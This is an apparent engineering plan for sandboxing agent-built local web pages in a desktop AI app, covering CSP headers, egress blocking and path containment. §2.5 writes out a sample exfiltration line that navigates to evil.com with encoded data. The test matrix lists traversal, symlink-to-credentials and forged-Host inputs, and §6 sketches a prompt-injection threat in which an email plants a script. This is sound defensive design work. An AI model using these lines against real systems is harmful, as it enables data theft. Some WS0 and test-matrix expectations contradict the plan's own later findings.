# Craft Pages — Implementation Plan

A Claude-Artifacts-style capability for Craft Agents: the user describes a webpage or small
interactive app in plain language, the agent builds it, and it runs **locally** on their machine —
reusing the connectors, credentials, permission model, and packaging that Craft Agents already has.

Reference complexity target: <https://holadelej.hu/en/> — a small multi-page site with images,
a language switcher, and a contact form.

> **Revision history.**
> **r2** (security review 1) — corrected three contradictions: pages were to be mounted on the RPC/WS
> port that the same document forbade; `validateFilePath` was named as the traversal guard despite
> allowing the whole home directory; an agent-writable `page.json` was the authorization record while
> the plan asserted hand-edits must be rejected. Trust model became wrapper + sandboxed page.
> **r3** (security review 2) — this revision. Sandboxing moved to an HTTP **header** so it applies to
> direct `/p/*` access, not just framed access. The r2 claim that CSP `'self'` matches nothing in a
> sandboxed document was **wrong** and is removed (see §2.4). Directory-swap updates replaced with
> immutable revision directories. Catalog mutations serialized. Host/Origin/CORS hardening added.
> Bundled-skill destination corrected. **WS7 scope narrowed: live-data pages are in-app only** —
> see §2.5 for why this was unavoidable.
> **r4** (WS0 spike executed) — §2.4/§2.5 are now MEASURED against Chromium **and WebKit**, not
> argued. Headline: **never combine the iframe `sandbox` attribute with the CSP `sandbox` header** —
> WebKit then executes no scripts at all, a silent total failure only a second engine could reveal.
> Further changes:
> (a) CSP `'self'` works — the r2/r3 explicit-origin workaround is dropped; (b) framed self-navigation
> is blocked by the **wrapper's `frame-src`**, a browser-native control r3 missed, with `webRequest`
> demoted to a second layer for top-level loads; (c) **ES modules do not execute** from an opaque
> origin — classic scripts only; (d) `style-src 'self'` blocks `<style>`/`style=` but permits CSSOM.
> Consequence: live-data pages must always be **framed**, never top-level, including in-app.
> Chromium and WebKit agreed on all 14 measured behaviours, so the §2.5 split is cross-engine, not a
> Chromium artefact. Evidence: `spike/ws0-pages-security/FINDINGS.md`.

---

## 1. Locked decisions

| Decision | Choice |
|---|---|
| **Live connector data** | Live at view time, **read-only**, via **approved query definitions** against a **trusted tool allowlist** |
| **Where pages are viewable** | **Static pages:** in-app **and** the user's own browser. **Live-data pages: in-app only** (§2.5) |
| **Page identity** | **Session artifact** for v1 — page content lives in the session data dir |
| **Forms** | **Visual only** in v1 — enforced by the sandbox, not by convention |
| **Trust model** | Untrusted page sandboxed via **CSP response header**, inside a trusted wrapper that owns connector access |
| **Serving** | A **dedicated `PagesServer`** with its own `node:http` listener — never the RPC/WS server |
| **Egress** | Default-deny at the Electron network layer for a dedicated pages partition (§2.5) |
| **Thin client / remote workspaces** | **Unsupported in v1** (§9) |

### Assumptions where no decision was given

1. **Query grants are agent-proposed, user-approved, batched per page**, phrased in plain language,
   with re-approval only when the approved query **set** changes (not when the page's appearance
   changes). Per-query prompting manufactures consent fatigue.
2. **Live data (WS7) ships behind its own flag, after static pages.** WS0–WS6 are a complete release.

---

## 2. Architecture

### 2.1 Serving: a dedicated listener, not the RPC server

`WsRpcServer` creates **one** `node:http` server and attaches the WebSocket server to it
(`packages/server-core/src/transport/server.ts:293-297`):

```ts
this.httpServer = createHttpServer(this.httpHandler)
this.wss = new WebSocketServer({ server: this.httpServer })
```

Passing an `httpHandler` therefore co-locates page content with the RPC transport — which performs
**no `Origin` check on WebSocket upgrade** and accepts a bearer token *or* a session cookie. Same-origin
page JS could upgrade a socket carrying the `HttpOnly` session cookie and obtain full RPC access.

Craft Pages runs its own **`PagesServer`**: separate `node:http` listener, own lifecycle,
loopback-only bind, independently persisted port. It does **not** extend `ServerConfig` — that governs
exposing the RPC server to thin clients, a different feature with a different threat model.

### 2.2 Trust model

```
  ┌─ TRUSTED WRAPPER ──────────────── http://127.0.0.1:{port}/w/{pageId} ─┐
  │  App-authored. Owns connector access. Strict, separate CSP.           │
  │  Validates every message: event.source === frame.contentWindow        │
  │                                                                        │
  │   ┌─ UNTRUSTED PAGE ─ /p/{pageId}/r/{rev}/index.html ──────────────┐  │
  │   │  Sandboxed by CSP RESPONSE HEADER (applies even if opened      │  │
  │   │  directly, not only when framed):                              │  │
  │   │    sandbox allow-scripts                                       │  │
  │   │  → opaque origin, no forms, no popups, no top-nav, no downloads│  │
  │   │                                                                 │  │
  │   │   postMessage({ queryId, params })  ──────────┐                │  │
  │   │   ◄───────────────  { ok, data } / { error }  │                │  │
  │   └───────────────────────────────────────────────┼────────────────┘  │
  └───────────────────────────────────────────────────┼───────────────────┘
                                                      ▼
                                POST /internal/query   (Origin-checked)
                                                      ▼
                    Grant store (app-controlled, outside any agent-writable dir)
                    grantId → source + tool (∈ trusted allowlist) + fixedArgs + param schema
                                                      ▼
                              Workspace-scoped McpClientPool (read-only)
```

**Sandboxing is delivered as a CSP response header, not an iframe attribute.** An `iframe sandbox`
attribute only applies when content is loaded *through the wrapper*; `/p/{id}/index.html` opened
directly in a tab would be unsandboxed. The CSP `sandbox` directive applies iframe-equivalent
sandboxing to the resource itself and is header-only by specification
([W3C CSP §sandbox](https://www.w3.org/TR/CSP/#directive-sandbox)).

> **The header is the ONLY sandbox — never also set the iframe `sandbox` attribute.** WS0 measured
> the combination: with both applied, **WebKit runs no scripts at all** (not even the first `<head>`
> script) while Chromium is unaffected. Header-only works in both engines and still enforces
> containment. "Defence in depth" here is a silent total-failure mode in a shipping browser.

**`/w/*` and `/p/*` get different policies.** The wrapper is app-authored and trusted; it needs no
sandbox and gets a tight allowlist of its own assets. Generated content gets the sandboxed,
`connect-src 'none'` policy. Never one shared policy.

### 2.3 Immutable revisions

Updates never mutate a served directory in place:

```
{workspaceRoot}/sessions/{sessionId}/data/pages/{slug}/
  ├── page.json            # agent-authored metadata — NEVER served
  └── revisions/
      ├── 1/public/…
      └── 2/public/…
```

**Implemented without a `current.json` pointer** — this section originally
proposed one, and the build showed it was unnecessary and slightly worse.

The reasoning for a pointer was right as far as it went: a directory cannot be
renamed over an existing non-empty directory. But replacing an existing *file*
by rename is not reliably atomic on Windows either (`fs.rename` can `EPERM` when
the target is open), which is exactly why
`packages/shared/src/sessions/persistence-queue.ts:159` unlinks first and accepts
a gap. A pointer just moves the same problem down one level.

Renaming a directory onto a name that does **not yet exist** is atomic on every
platform. So a revision is staged at `revisions/.staging-{n}` and renamed to
`revisions/{n}` as the single commit step, and the current revision is the
highest complete revision directory. A crash leaves either a complete revision
or a `.staging-` directory that is ignored on read and swept on the next write.
No pointer, no gap, one fewer failure mode. Three crash-safety tests cover it.

URLs are revisioned: `/p/{pageId}/r/{rev}/index.html`. That makes subresource
caching correct — remounting an iframe at the same URLs busts only the top-level
document, leaving `styles.css` and `app.js` stale, which is precisely the "make
the header blue does nothing" failure.

### 2.4 Opaque-origin consequences (corrected, then measured)

> **WS0 outcome.** Everything in this section and §2.5 has now been **run**
> against Chromium (Electron 39.2.7). See `spike/ws0-pages-security/FINDINGS.md`.
> Four results changed the design: `'self'` works (this section was wrong in r2);
> framed self-navigation is blocked by the wrapper's `frame-src`, not by
> `webRequest`; ES modules do not execute from an opaque origin; and
> `style-src 'self'` blocks `<style>` and `style=` but permits CSSOM writes.

Dropping `allow-same-origin` gives the page an opaque origin. **This does not break CSP `'self'`** —
verified in WS0: an external stylesheet applied and a classic script executed under `'self'`. A
header-delivered policy's self-origin comes from the **response URL** at parse time
([W3C CSP §parse-response-csp](https://www.w3.org/TR/CSP/#parse-response-csp)), not from the
document's subsequently-opaque origin. (The "`'self'` matches nothing when sandboxed" folklore applies
to **meta**-delivered policies inside an already-opaque document, and to `srcdoc`/`data:` frames. An
earlier revision of this plan asserted otherwise and was wrong.)

What *does* change, because these are origin-derived rather than CSP-derived:

| Consequence | Measured behaviour |
|---|---|
| **`event.origin` is the string `"null"`** | Confirmed. The wrapper **must** authenticate by `event.source === frame.contentWindow`; a forged message with the wrong source was correctly rejected. Never compare origins (never matches), never accept `origin === 'null'` (every sandboxed frame produces it). |
| **`localStorage` throws** | Confirmed — `SecurityError`. |
| **`document.cookie` throws** | **Stronger than predicted**: r2 expected an empty string; it throws `SecurityError`. |
| **ES modules do NOT execute** | **Not anticipated.** `<script type="module">` silently fails with *no CSP violation* — module scripts fetch in CORS mode, which is cross-origin from an opaque origin. Verified: adding `Access-Control-Allow-Origin: *` makes them work. **Decision: classic scripts only**, no ACAO header — it would let any site that learns the port and pageId read page content. |
| **Relative paths still work** | Confirmed. The document *URL* is unchanged; only the origin is opaque. |
| **`connect-src 'none'` blocks the page's OWN JSON** | Confirmed. Page data must ship as executed JS assigning a global, not as fetched JSON. |
| **No `allow-forms`** | Confirmed — submission produced no navigation. This is how "visual only" is *enforced*. It fails silently, so the skill teaches click handlers, not `<form>` submit. |

**`style-src 'self'` — the open decision, now closed by measurement:**

| Technique | Result | Violation |
|---|---|---|
| `<style>` block | blocked | `style-src-elem` |
| `style="..."` attribute | blocked | `style-src-attr` |
| `el.setAttribute('style', …)` | blocked | `style-src-attr` |
| `el.style.color = …` (CSSOM) | **allowed** | — |

Keep `style-src` strict. Styling goes in an external stylesheet; dynamic styling uses CSSOM. The skill
must forbid inline `<style>` and `style=` attributes — a model emits both by habit and they fail
*silently* (unstyled element, no error).

Because `connect-src 'none'` also blocks `fetch()` of the page's own JSON assets, data files must be
delivered as JS (`app-data.js` assigning a global) rather than fetched JSON. WS0 verifies this.

### 2.5 Egress control, and why live-data pages are in-app only

Assume the full header policy is applied: `connect-src 'none'` (no fetch/XHR/WebSocket),
`form-action 'none'` plus no `allow-forms`, no `allow-top-navigation`, no `allow-popups`, restricted
`img-src`. One channel remains:

```js
location.href = 'https://evil.com/?d=' + btoa(sensitiveData)
```

**A document navigating its own frame is not restricted by any sandbox flag**, and `navigate-to` was
proposed for exactly this case and **removed from CSP3 — it never shipped in any browser.**

WS0 measured this and found **two** controls, not one. The r2 text below claimed `webRequest` was the
only one; that was wrong.

| Context | Self-navigation off-origin | What stopped it |
|---|---|---|
| Framed in the wrapper | **blocked** (`ERR_BLOCKED_BY_CSP`) | the **wrapper's `frame-src 'self'`** — the embedding document governs where a child frame may navigate |
| Top-level document | **succeeded**, reached the network | nothing |
| Top-level + `webRequest` deny | **blocked** (`ERR_BLOCKED_BY_CLIENT`) | Electron network layer |

`frame-src` is the better control: browser-native, no Electron dependency, works in any engine. The
Electron partition deny is a second layer for the top-level case.

The top-level result confirms the split. Loaded directly, the sandboxed page navigated itself to
`http://127.0.0.1:9999/collect?d=SECRET_PAYLOAD` and genuinely attempted the connection.

**Stronger consequence than r2 stated:** a live-data page must **always be viewed framed inside the
wrapper**, never as a top-level document — *including in-app*. An "open in the browser pane" action on
a live-data page is a top-level load and forfeits the `frame-src` protection.

**Therefore the capability splits on a property the app can check — does this page hold grants?**

| | Static page (no grants) | Live-data page (has grants) |
|---|---|---|
| In-app | ✅ | ✅ egress default-denied by partition |
| User's own browser | ✅ | ❌ disabled, with a plain-language reason |
| Direct `/p/*` top-level load | allowed | rejected when `Sec-Fetch-Dest: document` |

This narrows the "openable in your own browser" locked requirement rather than pretending the threat
is mitigated. The common case is unaffected: a marketing site like the reference example holds no live
data and opens anywhere.

### 2.6 Why the agent tool is registry-mode

`SESSION_TOOL_DEFS` (`packages/session-tools-core/src/tool-defs.ts`) is the canonical registry. An
`executionMode: 'registry'` entry is picked up by **both** backends automatically, and — verified —
the handler executes in the **main process** for both: Claude in-process via `session-scoped-tools.ts`,
Pi by routing `tool_execute_request` back to main, where `pi-agent.ts:1588` calls
`SESSION_TOOL_REGISTRY.get(toolName)`. (`packages/session-mcp-server` exists and `sessionServerPath` is
computed at `runtime-resolver.ts:225`, but nothing spawns it.) Registry mode also avoids
`assertClaudeBackendSessionToolParity()` / `assertBackendSessionToolParity()`, which throw at session
start for *every* session if a backend-mode tool lacks an adapter.

---

## 3. What we reuse (verified)

| Need | Existing machinery | Location |
|---|---|---|
| Self-contained runtime | Bun + `uv` vendored per-platform; **a page needs neither — Electron is the runtime** | `apps/electron/electron-builder.yml` |
| Agent tool on both backends | `SESSION_TOOL_DEFS` registry entry | `packages/session-tools-core/src/tool-defs.ts` |
| Handler template | `render_template` — write into `ctx.dataPath`, return path | `packages/session-tools-core/src/handlers/render-template.ts` |
| Zero permission prompts | Safe mode permits Write/Edit into the session **data** folder | `packages/shared/src/agent/mode-manager.ts:1884` |
| Node ↔ web-standard adapter | Mounts a `(Request) => Response` on `node:http` | `packages/server-core/src/webui/node-adapter.ts` |
| RPC registration | `registerXHandlers(server, deps)` → `registerCoreRpcHandlers()` | `packages/server-core/src/handlers/rpc/index.ts` |
| Renderer API exposure | One `invoke(...)` entry covers Electron **and** webui | `apps/electron/src/transport/channel-map.ts` |
| Connector invocation | `McpClientPool.callTool(proxyName, args)` | `packages/shared/src/mcp/mcp-pool.ts:387` |
| Connector config → servers | `SourceServerBuilder.buildAll()` | `packages/shared/src/sources/server-builder.ts` |
| Credentials + OAuth refresh | `SourceCredentialManager`, `TokenRefreshManager` | `packages/shared/src/sources/` |
| Idempotent workspace migration | `loadWorkspace()` lazily `mkdirSync`s `skills/` | `packages/shared/src/workspaces/storage.ts:207-210` |
| Auto-update | electron-updater, autoDownload + autoInstallOnAppQuit | `apps/electron/src/main/auto-update.ts` |
| Fence dispatch | `html-preview`, `datatable`, `pdf-preview` pattern | `packages/ui/src/components/markdown/Markdown.tsx` |
| Preview block shell | JSON spec parsing, cache, error boundary, fullscreen handoff | `packages/ui/src/components/markdown/MarkdownHtmlBlock.tsx` |
| Pages visible in UI, free | Session file tree with live watcher | `apps/electron/src/renderer/components/right-sidebar/SessionFilesSection.tsx` |
| Agent self-verification | `BrowserPaneManager.navigate()` + `browser_tool` screenshot/console | `apps/electron/src/main/browser-pane-manager.ts` |
| Per-partition proxy + egress hooks | `session.fromPartition(...)`, `webRequest` | `apps/electron/src/main/network-proxy.ts` |

### Things that look reusable but are not

- **`validateFilePath` is not a containment guard here.** It `realpath`s and *then* checks against
  `allowedDirs = [homedir(), tmpdir(), ...]` (`packages/server-core/src/handlers/utils.ts:73-105`). A
  symlink in a page directory pointing at `~/.craft-agent/credentials.enc` resolves under `homedir()`
  and **passes**. Correct for its real job; wrong for this.
- **`createWebuiHandler()` is Bun-only** — `Bun.file` at 217/228/386/395, `Bun.password` in
  `webui/auth.ts`. Electron main runs Node.
- **`bootstrapServer`'s `httpHandler` slot** — §2.1.
- **The existing HTML preview cannot host a page** — `srcDoc`, no `allow-scripts`, inherits the
  embedder's CSP, relative assets don't resolve.
- **`McpClientPool` is per-session** — instantiated at `SessionManager.ts:3404`, torn down on close.
- **`~/.craft-agent/` is not a skill search path** — see §7.

---

## 4. Pre-work: repair CI (do not stub)

`bun run lint` and `validate:ci` are **already red**; six referenced scripts don't exist:

```
scripts/check-raw-sends.sh          scripts/lint-i18n-staged.sh
scripts/check-task-tool-checks.sh   scripts/lint-i18n-strings.sh
scripts/check-i18n-coverage.ts      scripts/typecheck-staged.sh
```

**Restore real implementations.** `check-raw-sends.sh` enforces that main-process code does not bypass
the typed RPC transport with raw `webContents.send` — a stub that exits 0 is worse than a missing
file, because it reports green. Historical content: `git show e792453b:scripts/check-raw-sends.sh`.
Separate PR, lands first.

---

## 5. Workstreams

### WS0 · Security ADR + prototype spike — **S/M · blocks everything**

Settle the trust model against real browsers before product code exists.

Deliverables: an ADR (separate listener; header-delivered `sandbox`; separate `/w/` and `/p/`
policies; `event.source` authentication; grants outside agent-writable dirs; egress default-deny;
capability split per §2.5) and a throwaway prototype — `PagesServer`, one wrapper, one static page,
one stub `postMessage` round-trip.

**Exit criteria — verified in Chrome, Safari, Firefox, and the Electron renderer, on all 3 platforms:**

*Does the page still work?*
- `script-src 'self'` loads a classic script **and** a `type="module"` script.
- `style-src 'self'` loads an external stylesheet; CSS `url()` assets resolve; WOFF2 font loads.
- Inline styles and `element.style` behave as the chosen policy intends (decide explicitly whether
  `'unsafe-inline'` is permitted for styles; the skill must match the decision).
- JSON delivered as `app-data.js` works; `fetch('data.json')` is blocked by `connect-src 'none'`.
- Multi-page relative navigation and relative `<img>` paths resolve.

*Is it contained?*
- Header `sandbox` applies to a **directly opened** `/p/{id}/index.html`, not only when framed.
- `window.top.location = 'https://example.com'` blocked.
- `<form action="https://example.com">` blocked.
- `window.open` blocked.
- `fetch('https://example.com')` blocked.
- `localStorage` throws; page degrades gracefully.
- Forged `postMessage` from a nested frame rejected by the `event.source` check.
- **Self-navigation** `location.href = 'https://example.com'` — confirm it is **not** blocked by CSP,
  and **is** blocked by the Electron partition's `webRequest` deny-list. This is the empirical basis
  for §2.5; if it is somehow blocked, revisit the capability split.

### WS1 · Page store, catalog service, `craft_page` tool — **M**

**Layout** per §2.3. `page.json` holds `{ id, slug, title, createdAt, updatedAt, requestedQueries[] }`.
`requestedQueries` is a **proposal**, never a grant.

**`PageCatalogService`** — a single main-process owner that **serializes all catalog mutations**
(promise-chain queue, same pattern as `sessionPersistenceQueue`). Concurrent sessions performing
independent read-modify-write on `pages-catalog.json` will lose entries even in one event loop, and the
headless server is a genuinely separate process. The tool reaches it through a `SessionToolContext`
callback — it never touches the file. The catalog is additionally treated as **rebuildable**: a scan
of page manifests can regenerate it, so corruption is recoverable rather than fatal.

Catalog: `pageId → { workspaceId, sessionId, slug, createdAt }`. Specify startup reconciliation (drop
entries whose directory is gone; log, don't throw), UUID minting **app-side only**, session-deletion
cleanup, and a friendly 404 for manually moved/deleted directories.

> This is the only workspace-level artifact in v1. Page *content* stays session-scoped per the locked
> decision; the catalog exists so `pageId` resolution survives restart.

**`craft_page` contract.** Commands `create`, `update`, `read`, `list`:

- Exact Zod schema per command; `slug` length-capped (the full Windows path includes workspace root,
  session UUID, and `data/pages/…/revisions/{n}/public/`, so `MAX_PATH` is a live constraint).
- Assets: text inline; binary by path already inside the session dir. Extension allowlist
  (`.html .css .js .json .png .jpg .webp .svg .woff2`); per-file, total-size, and file-count caps.
- `expectedRev` for optimistic concurrency; mismatch is a recoverable error, not a silent overwrite.
- Writes produce a **new revision directory**, then an atomic pointer swap (§2.3).
- `update` patches named files by default (copy-forward from the previous revision); `replaceAll`
  is explicit. Defaulting to replacement would make the model delete assets it forgot to re-list.
- Thumbnails are captured app-side from the wrapper via `BrowserPaneManager` — never page-supplied.

**`delete` is a separate tool.** `safeMode` is one value per tool def
(`packages/session-tools-core/src/tool-defs.ts:555`), so a single `craft_page` with `safeMode: 'allow'`
would make destructive deletion reachable in Explore mode. Ship `craft_page` as `'allow'` and, if
needed at all in v1, `craft_page_delete` as `'block'`. (`readOnly` on the def is a parallel-execution
hint, not a permission gate.)

### WS2 · `PagesServer`, containment, HTTP boundary — **M**

- `packages/server-core/src/pages/server.ts` — dedicated `node:http` listener, `127.0.0.1` only.
- `packages/server-core/src/pages/port.ts` — persisted port; bind, fall forward on `EADDRINUSE`,
  persist. **Normally stable, not guaranteed** — it cannot be if another process holds it. The app
  always resolves `pageId → current URL`; a port-bearing URL is never the user-facing identity.
- `packages/server-core/src/pages/handler.ts` — `(Request) => Response` against `node:fs`, never
  `Bun.*`. Routes: `GET /w/{pageId}` (wrapper), `GET /p/{pageId}/r/{rev}/*` (static),
  `POST /internal/query` (bridge; 404 while the flag is off).
- `packages/server-core/src/pages/containment.ts` — **dedicated guard**, not `validateFilePath`:
  canonicalize both the revision's `public/` root and the request; require containment; reject if
  **any** path component is a symlink; reject dotfiles, `page.json`, encoded
  separators (`%2f`, `%5c`), NUL, `:`; no directory listings; `GET`/`HEAD` only. Encoded-traversal and
  symlink-escape tests ship **with** this workstream.

**HTTP boundary hardening** (closes DNS-rebinding and localhost-CSRF):

- **Reject unexpected `Host`** — accept only the exact bound `127.0.0.1:{port}`.
- **Validate bridge `Origin`** against that exact origin. Never derive trust from `Host`.
- **Reject CORS preflights**; never emit permissive CORS headers.
- **Body limits in the Node request reader**, before JSON parsing — not after.
- **`Sec-Fetch-Dest: document`** on `/p/*` rejected for grant-holding pages (§2.5).
- Separate CSP policies for `/w/*` and `/p/*` (§2.2).
- `/p/*` headers: `X-Content-Type-Options: nosniff`, `Referrer-Policy: no-referrer`, restrictive
  `Permissions-Policy`. `Cache-Control: no-store` on the bridge; revisioned URLs make page assets
  safely cacheable, but if revisioned URLs are ever dropped, `no-store` must apply to **all** page
  assets.
- RPC surface: `handlers/rpc/pages.ts`, `RPC_CHANNELS.pages.*`, classification in
  `packages/shared/src/protocol/routing.ts` (**an exhaustiveness test fails if skipped**), wired into
  `registerCoreRpcHandlers`, exposed via `channel-map.ts`.

### WS3 · Electron wiring, partition, egress — **S/M (requires security review)**

- Start/stop `PagesServer` from the main-process lifecycle. **Do not** pass `httpHandler` to
  `bootstrapServer`.
- **Dedicated session partition** for page frames (e.g. `persist:craft-pages`), with
  `webRequest.onBeforeRequest` **default-denying** any URL outside `http://127.0.0.1:{pagesPort}`.
  This is the control that makes live-data pages viable at all (§2.5).
- Add that partition to `apps/electron/src/main/network-proxy.ts`'s proxy-application array
  (currently `defaultSession` + browser-pane). Omitting it silently breaks corporate-proxy users. Add
  a test asserting the array covers every partition constant.
- `apps/electron/src/renderer/index.html` — add `frame-src http://127.0.0.1:*`. The meta CSP is
  currently `default-src 'self'` with **no** `frame-src`, so it falls back to `'self'` and the wrapper
  iframe is blocked outright.

  > First time the app shell frames a foreign origin. Deliberate review required — it changes what
  > *any* future agent-authored content can embed.

### WS4 · Cold-start resolution + open-in-browser — **S**

Resolve `pageId` via `PageCatalogService` with no active session. "Open in browser" via `openExternal`,
**disabled for grant-holding pages** with a plain-language explanation (§2.5). Verify a weeks-old page
in an unloaded session opens after restart.

### WS5 · `craft-page` fence, compact card, revision refresh — **M**

- `packages/ui/src/components/markdown/CraftPageBlock.tsx` — copy the `MarkdownHtmlBlock` shell; point
  at the **wrapper** (`/w/{pageId}`), never `/p/*`.
- `packages/ui/src/components/markdown/Markdown.tsx` — **dispatch is duplicated** (~line 286 inline
  map, ~line 424 block map). Edit both or the block renders as raw JSON in one context.

The two problems the existing components don't solve:

1. **Stale previews** — solved structurally by revisioned URLs (§2.3), not by remounting. The fence
   carries `{pageId, rev}`; the card links to `/p/{id}/r/{rev}/`. Test that a rev bump changes what
   renders, including CSS and JS.
2. **Transcript pollution** — the in-chat fence is a **compact card** (title, thumbnail, "Open"), with
   the real page in the fullscreen overlay. N edits produce N cards, not N live frames.

   > **Scope note:** collapsing earlier cards for the same `pageId` spans transcript messages and needs
   > message-level indexing or shared artifact state — not a component-local change. Deferred; the
   > card alone fixes the memory problem because a card is not a live frame.

### WS6 · Deletion, flag gating, i18n, packaging — **S/M**

- **Session deletion dialog must be unambiguous.** Page content lives inside the session directory, so
  it cannot survive the session. Declining must **cancel the deletion**, not delete the session and
  keep the pages — which is impossible. Buttons: **[Delete chat and 2 pages]** / **[Cancel]**. Never
  a Yes/No that implies a third outcome. Catalog entries are cleaned up via `PageCatalogService`.
- **Feature-flag gating is end-to-end**: the `SESSION_TOOL_DEFS` entry, `PagesServer` startup, RPC
  channel registration, the UI renderer, and the prompt section each check `FEATURE_FLAGS.craftPages`.
  A flag that only hides prompt text leaves a live listener and a callable tool.
- i18n across **all** locale files (`scripts/check-i18n-parity.ts`, `scripts/sort-locales.ts --check`).
- Release note in `apps/electron/resources/release-notes/next.md` — never a `{version}.md` in a
  feature commit.

### WS7 · Live connector data — **L · behind `FEATURE_FLAGS.craftPagesLiveData`**

Not to be started until §2.5's capability split is implemented and WS0's self-navigation finding is
confirmed empirically.

**Trusted tool allowlist.** A grant naming a `toolName` is **not** sufficient — MCP tool names and
`readOnlyHint` annotations are server-controlled and cannot be trusted as proof a tool is
non-mutating. Maintain a curated, app-owned allowlist of `(sourceKind, toolName)` pairs known to be
read-only. **Validate at approval time *and* at execution time** — a tool can be removed from the
allowlist after a grant was issued.

**Grant store** — `{workspaceRoot}/page-grants.json`, app-owned, **outside** any agent-writable
directory, mutated only through a serialized service:

```
grantId → {
  pageId, sourceSlug, toolName,          // toolName ∈ trusted allowlist
  fixedArgs:   { … },                    // baked at approval
  paramSchema: { … },                    // CONSTRAINED subset, not arbitrary JSON Schema
  approvedAt, approvedQuerySetHash
}
```

- **Constrained parameter schemas only** — a fixed vocabulary (`string` with maxLength, `integer` with
  bounds, `enum`, `boolean`). No agent-authored `$ref`, no `pattern` (ReDoS), no unbounded nesting.
- **Runtime params can never overwrite `fixedArgs`** — enforce disjoint key sets at approval time and
  merge with `fixedArgs` last at execution time.
- **`approvedQuerySetHash`, not `approvedRev`** — restyling a page must not re-prompt for consent;
  only a change to the approved query set does.
- **Grant lifecycle** — deleted when the page is deleted, when its session is deleted, or when the
  underlying source is removed or re-authenticated.

**Bridge** — `POST /internal/query`, `Origin`-checked against the wrapper origin:
JSON content-type, schema validation, reject unknown fields, request/response size caps, per-page
concurrency cap, timeout with cancellation, rate limiting, `Cache-Control: no-store`, and **structured
error redaction** — never surface upstream error bodies, URLs, or auth failures to page JS; log fully
server-side, return an opaque code.

**Wrapper chrome** — trusted, always-visible, outside the sandboxed frame: names the active sources and
offers **revoke**. A live-data page must never be visually indistinguishable from a static one.

**Pool** — `packages/server-core/src/pages/source-pool.ts`, workspace-scoped `McpClientPool` from
`SourceServerBuilder.buildAll()`, fed by `SourceCredentialManager` + `TokenRefreshManager`. Lazy start
on first query; idle-timeout shutdown so stdio MCP subprocesses don't linger.

**Windows:** stdio sources spawn `npx`/`uvx` children. Doing so for a *viewed page* rather than an
agent turn is a new lifecycle — verify cleanup on quit and that a per-user `%LOCALAPPDATA%\Programs`
install can spawn them.

---

## 6. Security model

1. **Sandbox via CSP response header** — `sandbox allow-scripts`, with none of `allow-same-origin`,
   `allow-forms`, `allow-popups`, `allow-top-navigation*`, `allow-downloads`, `allow-modals`. Header
   delivery is what makes this apply to direct `/p/*` access.
2. **CSP as defense in depth**, separate policies for `/w/*` and `/p/*`. Generated content:
   `default-src 'self'; connect-src 'none'; form-action 'none'; base-uri 'none'; object-src 'none';
   frame-src 'none'; worker-src 'none'`. (`'self'` is correct here — §2.4.)
3. **Egress default-deny** on the pages partition — the only control covering self-navigation, and the
   reason live-data pages are in-app only (§2.5).
4. **Threat: prompt injection → exfiltration.** A malicious email or ticket read while building the
   page can plant a script. Controls 1–3 stop it; the grant store plus trusted tool allowlist bound
   what there is to steal.
5. **Never co-locate with the RPC/WS port** (§2.1). Independently, add an `Origin` allowlist to the
   WebSocket upgrade path.
6. **Containment guard** per WS2 — `validateFilePath` is unsuitable.
7. **HTTP boundary** — Host pinning, Origin validation, no CORS, pre-parse body limits.
8. **No new executables, no first-run downloads.** A downloaded binary is Gatekeeper-quarantined on
   macOS and SmartScreen bait on Windows, and fails offline or behind a proxy — i.e. it breaks exactly
   the target user. Enforce with a release-artifact size-delta check.
9. **Frame settings** — `nodeIntegration: false`, `contextIsolation: true`, **no preload** on the page
   frame.

### Known accepted limitation

Pages share one HTTP origin, so page A can reference page B's asset URLs. It cannot read them
(`connect-src 'none'`; opaque origin blocks cross-document access) and holds no token worth stealing —
authorization lives app-side, keyed by `pageId`. Per-page origins via `<pageId>.localhost` are **not** a
fix: Windows does not resolve `*.localhost`.

---

## 7. Install, upgrade, cross-platform

**Installer delta: ~0 bytes.** No new binary, runtime, notarization change, or first-run download.

**Upgrade is automatic** via electron-updater. For on-disk state, follow the idempotent pattern at
`packages/shared/src/workspaces/storage.ts:207-210` — seed the catalog file on workspace load if
absent; a half-failure self-heals next load. Workspace data lives under `~/.craft-agent/workspaces`, so
NSIS's `deleteAppDataOnUninstall: true` never touches it.

**The bundled skill needs a new discovery tier.** `loadAllSkills()`
(`packages/shared/src/skills/storage.ts:216`) scans exactly three locations —
`GLOBAL_AGENT_SKILLS_DIR` = `~/.agents/skills/`, `{workspace}/skills/`, and
`{project}/.agents/skills/`. **It does not scan `~/.craft-agent/`**, so an earlier revision's plan to
sync the skill there would have shipped a skill the agent never loads.

Add a **built-in tier beneath global** — a fourth source (`'builtin'`) read from
`getBundledAssetsDir('skills')`, loaded *first* so all three existing tiers override it. This gives the
right semantics on both axes: the skill updates with the app (no stale copy), and a user who writes
`~/.agents/skills/craft-pages/SKILL.md` still wins. Writing into `~/.agents/skills/` directly would
force a choice between clobbering user edits and going stale — neither acceptable.

Note the existing sync policies differ: `docs/`, `release-notes/`, `config-defaults.json` are
overwritten every launch; `themes/`, `permissions/`, `tool-icons/` are seed-once. The builtin-tier
approach sidesteps the question entirely by never copying into user space.

**Do not** add an `electron-builder.yml` `files` glob without a post-package assertion — globs
**silently no-op on missing directories**. `resources/session-mcp-server/**/*` and
`resources/pi-agent-server/**/*` are listed today and **neither exists**; with `asar: false` there is no
integrity error either. Extend the `>50MB claude binary` check in `scripts/build/win32.ts`.

**Lifetime:** pages are live only while Craft Agents is running. Say so in the UI. No background daemon
— that reopens signing, firewall, and update-restart problems for marginal benefit.

---

## 8. Test matrix

**Serving / containment**

| Test | Expected |
|---|---|
| Encoded traversal `%2e%2e%2f`, `..%5c` | 400 |
| Symlink in `public/` → `~/.craft-agent/credentials.enc` | 403, not served |
| `GET /p/{id}/r/{rev}/page.json` | 404 (manifest lives above `public/`) |
| Directory listing | 404 |
| Windows ADS `index.html::$DATA` | 400 |
| `POST`/`PUT`/`DELETE` on `/p/*` | 405 |
| `Host: evil.com` | 400 |
| CORS preflight on `/internal/query` | rejected, no CORS headers |
| Oversized body | rejected **before** JSON parse |
| Serving during a revision swap | always a complete revision, never a partial tree |

**Sandbox / CSP** — each run both framed **and** opened directly:

| Test | Expected |
|---|---|
| Header `sandbox` applies to direct `/p/*` load | yes |
| `script-src 'self'` — classic and `type="module"` | both load |
| `style-src 'self'`, CSS `url()`, WOFF2 | load |
| Top-nav, `<form>` submit, `window.open` | blocked |
| `fetch` external / `fetch('data.json')` | blocked |
| `localStorage` | throws; page degrades |
| Forged `postMessage` from nested frame | rejected by `event.source` |
| Self-navigation, Electron pages partition | **blocked by `webRequest`** |
